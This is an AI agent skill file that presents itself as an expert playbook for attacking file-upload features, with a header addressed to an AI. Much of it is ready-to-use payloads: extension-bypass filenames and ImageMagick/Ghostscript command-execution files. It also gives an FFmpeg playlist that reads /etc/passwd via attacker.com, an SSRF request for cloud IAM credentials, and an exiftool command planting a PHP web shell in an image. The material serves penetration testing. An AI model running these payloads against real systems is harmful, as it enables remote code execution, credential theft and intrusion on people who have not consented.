---
name: upload-insecure-files
description: >-
  Insecure file upload playbook. Use when testing upload validation, storage paths, processing pipelines, preview behavior, overwrite risks, and upload-to-RCE chains.
---

# SKILL: Upload Insecure Files

> **AI LOAD INSTRUCTION**: Expert file upload attack playbook. Full workflow: validation bypass, storage path abuse, post-upload access, parser exploitation, multi-tenant overwrite, and chaining into XSS, XXE, CMDi, traversal, or business logic impact.

## 0. RELATED ROUTING

- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) when filename/extraction path becomes filesystem control
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) when uploads rendered in browser
- [xxe-xml-external-entity](../xxe-xml-external-entity/SKILL.md) when SVG, OOXML, XML accepted
- [cmdi-command-injection](../cmdi-command-injection/SKILL.md) when processor/converter shells out

---

## 1. CORE MODEL

Test four separate trust boundaries:
1. **Accept**: validation before file stored
2. **Store**: where/how file written and named
3. **Process**: background tools, converters, parsers touching it
4. **Serve**: how later downloaded, rendered, or shared

---

## 2. RECON QUESTIONS

- Which extensions are allowed, denied, or normalized?
- Does backend trust extension, MIME type, magic bytes, or all three?
- Is file renamed, transcoded, unzipped, scanned, or re-hosted?
- Can one user predict or overwrite another user's file path?
- Do filenames/metadata reflect into HTML, logs, admin consoles, or PDFs?

---

## 3. VALIDATION BYPASS MATRIX

| Validation Style | What to Test |
|---|---|
| extension blacklist | double extension, case toggles, trailing dot |
| content-type only | mismatched multipart Content-Type |
| magic-byte only | polyglot files or valid header + dangerous tail |
| image-only policy | SVG, malformed image + metadata, parser differential |
| archive/import only | zip contents, nested path names, XML members |

Representative bypass families:
```text
shell.php.jpg
avatar.jpg.php
file.asp;.jpg        (IIS semicolon)
file.php%00.jpg      (null byte truncation)
file.svg             (XSS/XXE)
archive.zip          (zip slip)

Case: shell.PhP  shell.pHP  shell.ASPX
Trailing: shell.php.  shell.php::$DATA  shell.php%20
Newline (Apache CVE-2017-15715): shell.php\x0a
```

---

## 4. STORAGE AND RETRIEVAL ABUSE

```text
# Predictable paths:
/uploads/USER_ID/avatar.png
/files/org-slug/report.pdf

# Test:
- Cross-tenant read by guessing IDs/slugs
- Overwrite by reusing another user's filename
- Path normalization bugs in filename/archive members
```

**Filename injection surfaces**: gallery HTML, admin panels, PDF/CSV exports, logs, emails.

---

## 5. PROCESSING-CHAIN ATTACKS

| Processor | Risk |
|---|---|
| Image resizing | parser differential, ImageMagick/library bugs, metadata |
| Video transcoding | FFmpeg protocol abuse (HLS SSRF, local file read) |
| Archive extraction | zip slip, overwrite, decompression bombs |
| Document import | CSV formula injection, office XML, macro-adjacent |
| SVG/XML parsing | XXE, SSRF, local file disclosure |
| HTML-to-PDF | SSRF, script execution, local file references |

---

## 6. IMAGEMAGICK RCE (CVE-2016-3714)

```text
# MVG file (upload as .mvg or rename):
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/"|id > /tmp/pwned")'  
pop graphic-context

# SVG delegate:
<svg><image xlink:href="https://example.com/x&quot;|id>/tmp/p&quot;"/></svg>

# Ghostscript via .eps/.ps/.pdf:
%!PS
mark /OutputFile (%pipe%id > /tmp/pwned) currentdevice putdeviceprops
```

---

## 7. FFMPEG SSRF/LFR

```m3u8
# HLS playlist for local file read:
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://attacker.com/header.txt|file:///etc/passwd
#EXT-X-ENDLIST

# SSRF to cloud metadata:
#EXTINF:10.0,
http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```

---

## 8. POLYGLOT FILES

```bash
# PNG + PHP: inject code into EXIF/tEXt chunk
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.png
# Upload -> LFI include -> PHP executes

# JPEG + JS (XSS via MIME sniff):
exiftool -Comment='<script>alert(document.domain)</script>' photo.jpg

# S3 presigned URL abuse:
# If content-type not in SignedHeaders -> change to text/html -> XSS
# If path not fully signed -> path traversal
```

---

## 9. NGINX / APACHE / IIS PARSING

```text
# Nginx + cgi.fix_pathinfo=1:
/uploads/image.jpg/.php  -> PHP processes image.jpg as PHP

# Apache multi-extension:
shell.php.jpg  -> executes as PHP if AddHandler applies

# IIS semicolon:
shell.asp;.jpg -> IIS executes as ASP
shell.asp::$DATA -> NTFS ADS bypass
```

---

## 10. S3/CLOUD UPLOAD

```text
# Check SignedHeaders in presigned URL:
?X-Amz-SignedHeaders=host;content-type  <- good
?X-Amz-SignedHeaders=host               <- if no content-type: change to text/html

# Azure SAS scope: container-level write -> write to any blob
```

---

## 11. TEST SEQUENCE

```text
1. Upload benign marker file -> map rename, path, retrieval behavior
2. Try validation bypass (ext) + active content (SVG/PHP) sample
3. Check retrieval: attachment vs inline render vs background processing
4. Pivot by processor: XSS, XXE, CMDi, zip slip, or SSRF
5. Run tenant-boundary and overwrite tests
```

## 12. CHAINING MAP

| Observation | Pivot |
|---|---|
| SVG or XML accepted | xxe-xml-external-entity |
| filename/metadata reflected | xss-cross-site-scripting |
| converter/processor shells out | cmdi-command-injection |
| extraction path controllable | path-traversal-lfi |
| overwrite/quota/tenant bug | business-logic-vulnerabilities |
